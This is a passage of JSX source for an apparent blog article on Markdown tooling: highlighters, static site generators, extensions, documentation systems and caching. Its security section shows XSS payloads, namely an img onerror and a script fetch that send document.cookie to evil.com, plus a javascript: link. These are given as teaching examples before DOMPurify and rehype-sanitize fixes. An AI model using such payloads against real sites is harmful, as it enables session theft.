      {/* Shiki Example */}
      <div style={{ background: '#1e1e1e', borderRadius: 8, padding: '14px 18px', marginBottom: 20, overflowX: 'auto' }}>
        <pre style={{ color: '#d4d4d4', fontSize: 13, lineHeight: 1.6, margin: 0 }}>
{`import { codeToHtml } from 'shiki';

const html = await codeToHtml('console.log("hello")', {
  lang: 'javascript',
  theme: 'github-dark',
});
// Returns pre-highlighted HTML with inline styles
// No client-side JS needed for rendering`}
        </pre>
      </div>

      {/* Highlighter Comparison */}
      <div style={{ overflowX: 'auto', marginBottom: 28 }}>
        <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: 14 }}>
          <thead>
            <tr style={{ background: '#f1f5f9' }}>
              <th style={{ padding: '10px 14px', textAlign: 'left', borderBottom: '2px solid #e2e8f0' }}>Highlighter</th>
              <th style={{ padding: '10px 14px', textAlign: 'left', borderBottom: '2px solid #e2e8f0' }}>Rendering</th>
              <th style={{ padding: '10px 14px', textAlign: 'left', borderBottom: '2px solid #e2e8f0' }}>Languages</th>
              <th style={{ padding: '10px 14px', textAlign: 'left', borderBottom: '2px solid #e2e8f0' }}>Themes</th>
              <th style={{ padding: '10px 14px', textAlign: 'left', borderBottom: '2px solid #e2e8f0' }}>Best For</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td style={{ padding: '10px 14px', borderBottom: '1px solid #e2e8f0', fontWeight: 600 }}>highlight.js</td>
              <td style={{ padding: '10px 14px', borderBottom: '1px solid #e2e8f0' }}>Client/Server</td>
              <td style={{ padding: '10px 14px', borderBottom: '1px solid #e2e8f0' }}>190+</td>
              <td style={{ padding: '10px 14px', borderBottom: '1px solid #e2e8f0' }}>90+</td>
              <td style={{ padding: '10px 14px', borderBottom: '1px solid #e2e8f0' }}>Broad support</td>
            </tr>
            <tr style={{ background: '#f8fafc' }}>
              <td style={{ padding: '10px 14px', borderBottom: '1px solid #e2e8f0', fontWeight: 600 }}>Prism</td>
              <td style={{ padding: '10px 14px', borderBottom: '1px solid #e2e8f0' }}>Client-side</td>
              <td style={{ padding: '10px 14px', borderBottom: '1px solid #e2e8f0' }}>270+</td>
              <td style={{ padding: '10px 14px', borderBottom: '1px solid #e2e8f0' }}>8+ (extensible)</td>
              <td style={{ padding: '10px 14px', borderBottom: '1px solid #e2e8f0' }}>Modularity, small bundle</td>
            </tr>
            <tr>
              <td style={{ padding: '10px 14px', borderBottom: '1px solid #e2e8f0', fontWeight: 600 }}>Shiki</td>
              <td style={{ padding: '10px 14px', borderBottom: '1px solid #e2e8f0' }}>Build-time</td>
              <td style={{ padding: '10px 14px', borderBottom: '1px solid #e2e8f0' }}>200+</td>
              <td style={{ padding: '10px 14px', borderBottom: '1px solid #e2e8f0' }}>All VS Code themes</td>
              <td style={{ padding: '10px 14px', borderBottom: '1px solid #e2e8f0' }}>SSG, VS Code accuracy</td>
            </tr>
          </tbody>
        </table>
      </div>

      {/* Section 8: SSG */}
      <h2 style={{ fontSize: 24, fontWeight: 700, marginTop: 40, marginBottom: 12 }} dangerouslySetInnerHTML={{ __html: t.h2_ssg }} />
      <p style={{ lineHeight: 1.8, marginBottom: 14, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_ssg_intro }} />

      <h3 style={{ fontSize: 18, fontWeight: 600, marginTop: 24, marginBottom: 8 }}>{t.h3_nextjs}</h3>
      <p style={{ lineHeight: 1.8, marginBottom: 10, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_nextjs }} />
      <div style={{ background: '#1e1e1e', borderRadius: 8, padding: '14px 18px', marginBottom: 20, overflowX: 'auto' }}>
        <pre style={{ color: '#d4d4d4', fontSize: 13, lineHeight: 1.6, margin: 0 }}>
{`// next.config.mjs - MDX support
import createMDX from '@next/mdx';

const withMDX = createMDX({
  options: {
    remarkPlugins: [remarkGfm, remarkMath],
    rehypePlugins: [rehypeKatex, rehypeHighlight],
  },
});

export default withMDX({
  pageExtensions: ['js', 'jsx', 'mdx', 'ts', 'tsx'],
});`}
        </pre>
      </div>

      <h3 style={{ fontSize: 18, fontWeight: 600, marginTop: 24, marginBottom: 8 }}>{t.h3_gatsby}</h3>
      <p style={{ lineHeight: 1.8, marginBottom: 14, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_gatsby }} />

      <h3 style={{ fontSize: 18, fontWeight: 600, marginTop: 24, marginBottom: 8 }}>{t.h3_hugo}</h3>
      <p style={{ lineHeight: 1.8, marginBottom: 10, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_hugo }} />
      <div style={{ background: '#1e1e1e', borderRadius: 8, padding: '14px 18px', marginBottom: 20, overflowX: 'auto' }}>
        <div style={{ color: '#9cdcfe', fontSize: 13, marginBottom: 8 }}>hugo.toml - goldmark config:</div>
        <pre style={{ color: '#d4d4d4', fontSize: 13, lineHeight: 1.6, margin: 0 }}>
{`[markup.goldmark.renderer]
  unsafe = false

[markup.goldmark.extensions]
  footnote = true
  strikethrough = true
  table = true
  taskList = true

[markup.highlight]
  style = "monokai"
  lineNos = true`}
        </pre>
      </div>

      <h3 style={{ fontSize: 18, fontWeight: 600, marginTop: 24, marginBottom: 8 }}>{t.h3_jekyll}</h3>
      <p style={{ lineHeight: 1.8, marginBottom: 14, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_jekyll }} />

      {/* Section 9: Extensions */}
      <h2 style={{ fontSize: 24, fontWeight: 700, marginTop: 40, marginBottom: 12 }} dangerouslySetInnerHTML={{ __html: t.h2_extensions }} />
      <p style={{ lineHeight: 1.8, marginBottom: 14, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_extensions_intro }} />

      <h3 style={{ fontSize: 18, fontWeight: 600, marginTop: 24, marginBottom: 8 }}>{t.h3_katex}</h3>
      <p style={{ lineHeight: 1.8, marginBottom: 10, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_katex }} />
      <div style={{ background: '#1e1e1e', borderRadius: 8, padding: '14px 18px', marginBottom: 20, overflowX: 'auto' }}>
        <pre style={{ color: '#d4d4d4', fontSize: 13, lineHeight: 1.6, margin: 0 }}>
{`Inline math: $E = mc^2$

Block math:
$$
\\sum_{i=1}^{n} x_i = x_1 + x_2 + \\cdots + x_n
$$

Quadratic formula:
$$
x = \\frac{-b \\pm \\sqrt{b^2 - 4ac}}{2a}
$$`}
        </pre>
      </div>

      <h3 style={{ fontSize: 18, fontWeight: 600, marginTop: 24, marginBottom: 8 }}>{t.h3_mermaid}</h3>
      <p style={{ lineHeight: 1.8, marginBottom: 10, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_mermaid }} />
      <div style={{ background: '#1e1e1e', borderRadius: 8, padding: '14px 18px', marginBottom: 20, overflowX: 'auto' }}>
        <pre style={{ color: '#d4d4d4', fontSize: 13, lineHeight: 1.6, margin: 0 }}>
{`\`\`\`mermaid
graph TD
    A[Markdown Source] --> B{Parser}
    B --> C[AST]
    C --> D[Transform Plugins]
    D --> E[HTML AST]
    E --> F[Sanitize]
    F --> G[HTML Output]
\`\`\``}
        </pre>
      </div>

      <h3 style={{ fontSize: 18, fontWeight: 600, marginTop: 24, marginBottom: 8 }}>{t.h3_footnotes}</h3>
      <p style={{ lineHeight: 1.8, marginBottom: 14, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_footnotes }} />

      {/* Section 10: Security */}
      <h2 style={{ fontSize: 24, fontWeight: 700, marginTop: 40, marginBottom: 12 }} dangerouslySetInnerHTML={{ __html: t.h2_security }} />
      <p style={{ lineHeight: 1.8, marginBottom: 14, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_security_intro }} />

      <h3 style={{ fontSize: 18, fontWeight: 600, marginTop: 24, marginBottom: 8 }}>{t.h3_xss_risks}</h3>
      <p style={{ lineHeight: 1.8, marginBottom: 14, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_xss_risks }} />

      {/* XSS Example */}
      <div style={{ background: '#1e1e1e', borderRadius: 8, padding: '14px 18px', marginBottom: 20, overflowX: 'auto' }}>
        <div style={{ color: '#f44747', fontSize: 13, marginBottom: 8 }}>Dangerous Markdown (user input):</div>
        <pre style={{ color: '#d4d4d4', fontSize: 13, lineHeight: 1.6, margin: 0 }}>
{`# Innocent looking title

<img src=x onerror="document.location='https://evil.com/steal?c='+document.cookie">

Click [here](javascript:alert('XSS'))

<script>fetch('https://evil.com/log?data='+document.cookie)</script>`}
        </pre>
      </div>

      <h3 style={{ fontSize: 18, fontWeight: 600, marginTop: 24, marginBottom: 8 }}>{t.h3_dompurify}</h3>
      <p style={{ lineHeight: 1.8, marginBottom: 10, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_dompurify }} />
      <div style={{ background: '#1e1e1e', borderRadius: 8, padding: '14px 18px', marginBottom: 20, overflowX: 'auto' }}>
        <pre style={{ color: '#d4d4d4', fontSize: 13, lineHeight: 1.6, margin: 0 }}>
{`import { marked } from 'marked';
import DOMPurify from 'dompurify';

// Step 1: Parse Markdown to raw HTML
const rawHtml = marked.parse(userMarkdown);

// Step 2: Sanitize the HTML
const cleanHtml = DOMPurify.sanitize(rawHtml, {
  ALLOWED_TAGS: ['h1','h2','h3','p','a','ul','ol','li',
                 'code','pre','strong','em','blockquote',
                 'table','thead','tbody','tr','th','td','img'],
  ALLOWED_ATTR: ['href','src','alt','class'],
  FORBID_ATTR: ['onerror','onclick','onload'],
});

// Step 3: Render sanitized HTML safely`}
        </pre>
      </div>

      <h3 style={{ fontSize: 18, fontWeight: 600, marginTop: 24, marginBottom: 8 }}>{t.h3_rehype_sanitize}</h3>
      <p style={{ lineHeight: 1.8, marginBottom: 10, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_rehype_sanitize }} />
      <div style={{ background: '#1e1e1e', borderRadius: 8, padding: '14px 18px', marginBottom: 20, overflowX: 'auto' }}>
        <pre style={{ color: '#d4d4d4', fontSize: 13, lineHeight: 1.6, margin: 0 }}>
{`import { unified } from 'unified';
import remarkParse from 'remark-parse';
import remarkRehype from 'remark-rehype';
import rehypeSanitize, { defaultSchema } from 'rehype-sanitize';
import rehypeStringify from 'rehype-stringify';

const result = await unified()
  .use(remarkParse)
  .use(remarkRehype, { allowDangerousHtml: false })
  .use(rehypeSanitize, defaultSchema) // GitHub-compatible schema
  .use(rehypeStringify)
  .process(userMarkdown);`}
        </pre>
      </div>

      <h3 style={{ fontSize: 18, fontWeight: 600, marginTop: 24, marginBottom: 8 }}>{t.h3_best_practices}</h3>
      <p style={{ lineHeight: 1.8, marginBottom: 14, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_best_practices }} />

      {/* Section 11: Documentation Systems */}
      <h2 style={{ fontSize: 24, fontWeight: 700, marginTop: 40, marginBottom: 12 }} dangerouslySetInnerHTML={{ __html: t.h2_docs }} />
      <p style={{ lineHeight: 1.8, marginBottom: 14, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_docs_intro }} />

      <h3 style={{ fontSize: 18, fontWeight: 600, marginTop: 24, marginBottom: 8 }}>{t.h3_docusaurus}</h3>
      <p style={{ lineHeight: 1.8, marginBottom: 14, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_docusaurus }} />

      <h3 style={{ fontSize: 18, fontWeight: 600, marginTop: 24, marginBottom: 8 }}>{t.h3_mkdocs}</h3>
      <p style={{ lineHeight: 1.8, marginBottom: 10, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_mkdocs }} />
      <div style={{ background: '#1e1e1e', borderRadius: 8, padding: '14px 18px', marginBottom: 20, overflowX: 'auto' }}>
        <div style={{ color: '#9cdcfe', fontSize: 13, marginBottom: 8 }}>mkdocs.yml:</div>
        <pre style={{ color: '#d4d4d4', fontSize: 13, lineHeight: 1.6, margin: 0 }}>
{`theme:
  name: material

markdown_extensions:
  - pymdownx.highlight:
      anchor_linenums: true
  - pymdownx.superfences:
      custom_fences:
        - name: mermaid
          class: mermaid
  - pymdownx.tabbed:
      alternate_style: true
  - pymdownx.tasklist:
      custom_checkbox: true
  - footnotes
  - admonition`}
        </pre>
      </div>

      <h3 style={{ fontSize: 18, fontWeight: 600, marginTop: 24, marginBottom: 8 }}>{t.h3_mintlify}</h3>
      <p style={{ lineHeight: 1.8, marginBottom: 14, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_mintlify }} />

      {/* Section 12: Performance */}
      <h2 style={{ fontSize: 24, fontWeight: 700, marginTop: 40, marginBottom: 12 }} dangerouslySetInnerHTML={{ __html: t.h2_performance }} />
      <p style={{ lineHeight: 1.8, marginBottom: 14, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_performance_intro }} />

      <h3 style={{ fontSize: 18, fontWeight: 600, marginTop: 24, marginBottom: 8 }}>{t.h3_incremental}</h3>
      <p style={{ lineHeight: 1.8, marginBottom: 14, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_incremental }} />

      <h3 style={{ fontSize: 18, fontWeight: 600, marginTop: 24, marginBottom: 8 }}>{t.h3_caching}</h3>
      <p style={{ lineHeight: 1.8, marginBottom: 10, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_caching }} />
      <div style={{ background: '#1e1e1e', borderRadius: 8, padding: '14px 18px', marginBottom: 20, overflowX: 'auto' }}>
        <pre style={{ color: '#d4d4d4', fontSize: 13, lineHeight: 1.6, margin: 0 }}>
{`import crypto from 'crypto';
import fs from 'fs';

function convertWithCache(markdown: string, cacheDir: string) {
  const hash = crypto
    .createHash('sha256')
    .update(markdown)
    .digest('hex');
  const cachePath = \`\${cacheDir}/\${hash}.html\`;

  if (fs.existsSync(cachePath)) {
    return fs.readFileSync(cachePath, 'utf8');
  }

  const html = marked.parse(markdown);
  fs.writeFileSync(cachePath, html);
  return html;
}`}
        </pre>
      </div>

      <h3 style={{ fontSize: 18, fontWeight: 600, marginTop: 24, marginBottom: 8 }}>{t.h3_streaming}</h3>
      <p style={{ lineHeight: 1.8, marginBottom: 14, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_streaming }} />

      {/* CTA: Try the Tool (bottom) */}
      <p style={{ marginTop: 12, fontSize: 15 }}>{lang === 'zh' ? '另请参阅：' : 'See also: '}<Link href={`/${lang}/blog/text-diff-online-guide`} style={{ color: 'var(--accent)', textDecoration: 'underline' }}>text diff checker</Link></p>
          <div style={{ background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)', borderRadius: 8, padding: '20px 24px', margin: '32px 0', color: '#fff' }}>
        <strong style={{ fontSize: 18 }}>{t.tryTool}</strong>
        <p style={{ margin: '6px 0 12px', fontSize: 14, opacity: 0.92 }}>{t.tryToolDesc}</p>
        <Link
          href={`/${lang}/tools/markdown-preview`}
          style={{ display: 'inline-block', background: '#fff', color: '#764ba2', fontWeight: 700, padding: '10px 24px', borderRadius: 6, textDecoration: 'none', fontSize: 15 }}
        >
          Markdown Preview Tool &rarr;
        </Link>
      </div>

      {/* FAQ Section */}
      <h2 style={{ fontSize: 24, fontWeight: 700, marginTop: 40, marginBottom: 16 }}>{t.h2_faq}</h2>

      {[
        { q: t.faq1_q, a: t.faq1_a },
        { q: t.faq2_q, a: t.faq2_a },
        { q: t.faq3_q, a: t.faq3_a },
        { q: t.faq4_q, a: t.faq4_a },
        { q: t.faq5_q, a: t.faq5_a },
        { q: t.faq6_q, a: t.faq6_a },
        { q: t.faq7_q, a: t.faq7_a },
        { q: t.faq8_q, a: t.faq8_a },
      ].map((faq, i) => (
        <details
          key={i}
          style={{ marginBottom: 12, border: '1px solid #e2e8f0', borderRadius: 8, overflow: 'hidden' }}
        >
          <summary style={{ padding: '14px 18px', fontWeight: 600, fontSize: 15, cursor: 'pointer', background: '#f8fafc' }}>
            {faq.q}
          </summary>
          <div style={{ padding: '12px 18px', fontSize: 15, lineHeight: 1.7, borderTop: '1px solid #e2e8f0' }}>
            {faq.a}
          </div>
        </details>
      ))}

      {/* Conclusion */}
      <div style={{ marginTop: 32, padding: '20px 24px', background: '#f8fafc', borderRadius: 8, fontSize: 15, lineHeight: 1.8 }}>
        <p style={{ margin: 0 }}>{t.conclusion}</p>
      </div>
    </article>
  );
}
